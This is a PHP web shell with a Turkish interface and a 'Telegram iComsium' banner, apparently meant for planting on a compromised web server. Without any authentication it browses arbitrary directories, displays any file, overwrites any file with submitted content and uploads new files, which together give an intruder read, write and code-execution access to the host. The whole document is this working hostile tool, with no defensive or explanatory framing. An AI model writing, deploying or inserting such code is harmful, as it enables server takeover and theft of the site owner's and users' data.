<?php
$root = __DIR__;
$style1 = 'color:#000;';
$style2 = 'color:#00a;font-weight:bold;';

function updir($ADir){
    $ADir = rtrim($ADir, '/');
    return substr($ADir, 0, strrpos($ADir, '/'));
}

$path = isset($_GET['file']) ? $_GET['file'] : $root;

// -------- Dosya görüntüleme --------
if (isset($_GET['view']) && is_file($_GET['view'])) {
    header("Content-type: text/plain");
    readfile($_GET['view']);
    exit;
}

// -------- Dosya düzenleme (kaydetme) --------
if (isset($_POST['save_file']) && isset($_POST['content'])) {
    file_put_contents($_POST['save_file'], $_POST['content']);
    echo "<b>Dosya kaydedildi.</b><br><br>";
}

// -------- Dosya yükleme --------
if (isset($_FILES['upload_file'])) {
    $target = rtrim($path, '/') . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        echo "<b>Dosya yüklendi:</b> " . basename($target) . "<br><br>";
    } else {
        echo "<b>Yükleme hatası!</b><br><br>";
    }
}

echo "<b>Telegram iComsium Current root:</b> $root <br>";
echo "<b>Current path:</b> $path <hr>";

echo '<a href="?file='.updir($path).'">..</a><br />';

foreach (glob(rtrim($path,'/').'/*') as $file) {
    echo '<a style="'.(is_file($file)?$style1:$style2).'" href="?file='.$file.'">'.basename($file).'</a>';

    if (is_file($file)) {
        echo ' | <a href="?view='.$file.'" target="_blank">[Göster]</a>';
        echo ' | <a href="?edit='.$file.'">[Düzenle]</a>';
    }

    echo "<br>";
}

echo "<hr>";


// -------- Dosya düzenleme arayüzü --------
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $editFile = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($editFile));
    echo "<h3>Dosya Düzenle: ".basename($editFile)."</h3>";
    echo '
        <form method="POST">
            <textarea name="content" style="width:100%;height:300px;">'.$content.'</textarea><br><br>
            <input type="hidden" name="save_file" value="'.$editFile.'">
            <button type="submit">Kaydet</button>
        </form>
        <hr>
    ';
}


// -------- Dosya yükleme formu --------
echo '<h3>Dosya Yükle</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload_file">
    <button type="submit">Yükle</button>
</form>';
?>
